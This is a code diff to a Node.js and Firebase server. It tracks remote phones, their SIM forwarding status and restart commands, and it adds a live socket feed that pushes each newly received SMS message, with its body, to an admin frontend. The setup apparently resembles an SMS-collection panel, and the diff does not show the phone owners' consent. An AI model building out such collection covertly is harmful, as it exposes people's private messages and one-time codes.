@@ -424,7 +424,6 @@ async function handleCheckOnlineChange(snap) {
 
   console.log(`♻️ RESET CLOCK UPDATED for ${uid} → ${now}`);
 
-  // OLD CHECK LOGIC (FCM ping)
   const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
   const token = devSnap.val()?.fcmToken;
   if (!token) return;
@@ -475,7 +474,6 @@ app.get("/restart/:uid", async (req, res) => {
     const diff = Date.now() - Number(data.restartAt);
 
     if (diff > RESTART_EXPIRY) {
-      // Auto remove
       await rtdb.ref(`restart/${uid}`).remove();
       return res.json({ success: true, data: null });
     }
@@ -584,6 +582,7 @@ function handleSmsStatusSingle(uid, msgId, data, event) {
 =========================================
 `);
 }
+
 smsStatusRef.on("child_added", (snap) => {
   const uid = snap.key;
   const all = snap.val() || {};
@@ -638,7 +637,6 @@ function handleSimForwardChange(snap, event = "update") {
 
   const raw = snap.val() || {};
 
-  // Always return BOTH 0 and 1
   const sim0 = raw["0"]
     ? {
         status: raw["0"].status || "unknown",
@@ -686,21 +684,22 @@ simForwardRef.on("child_removed", (snap) =>
 const smsNotificationsRef = rtdb.ref(SMS_NODE);
 
 function getLatestChange(prevObj, newObj) {
-  if (!prevObj) return Object.keys(newObj)[0]; // first time added
+  if (!prevObj) return Object.keys(newObj)[0];
 
   const prevKeys = new Set(Object.keys(prevObj));
   const newKeys = Object.keys(newObj);
 
   for (let k of newKeys) {
-    if (!prevKeys.has(k)) return k; // NEW SMS added
-    if (JSON.stringify(prevObj[k]) !== JSON.stringify(newObj[k])) return k; // Changed SMS
+    if (!prevKeys.has(k)) return k; 
+    if (JSON.stringify(prevObj[k]) !== JSON.stringify(newObj[k])) return k;
   }
 
-  return null; // no change
+  return null; 
 }
 
-const smsCache = {}; // cache per device
+const smsCache = {};
 
+// ⭐⭐ UPDATED: emit `smsLogsNew` also ⭐⭐
 async function handleSmsNotificationsBranch(snap, event = "update") {
   const uid = snap.key;
   const messages = snap.val() || {};
@@ -708,7 +707,7 @@ async function handleSmsNotificationsBranch(snap, event = "update") {
   const prev = smsCache[uid] || null;
   const changedMsgId = getLatestChange(prev, messages);
 
-  smsCache[uid] = messages; // update cache
+  smsCache[uid] = messages;
 
   if (changedMsgId) {
     const sms = messages[changedMsgId];
@@ -722,12 +721,24 @@ async function handleSmsNotificationsBranch(snap, event = "update") {
     console.log(`🕒 Timestamp: ${sms.timestamp}`);
     console.log(`✉️ Message: ${sms.body}`);
     console.log("=======================================\n\n");
+
+    // ⭐ SEND SINGLE NEW/UPDATED SMS TO FRONTEND
+    io.emit("smsLogsNew", {
+      success: true,
+      uniqueid: uid,
+      msgId: changedMsgId,
+      data: {
+        id: changedMsgId,
+        uniqueid: uid,
+        ...sms,
+      },
+    });
   }
 
-  // Emit per-device live list
+  // Per-device full list (for device-details page)
   emitSmsDeviceLive(uid, messages, event);
 
-  // Also refresh ALL-SMS list
+  // Full refresh for All Messages page
   await refreshSmsAllLive(`sms_${event}:${uid}`);
 }
 
@@ -784,7 +795,6 @@ app.get("/api/devices", async (req, res) => {
 
 refreshDevicesLive("initial");
 refreshSmsAllLive("initial");
-
 
 app.use(adminRoutes);
 app.use("/api", checkRoutes);
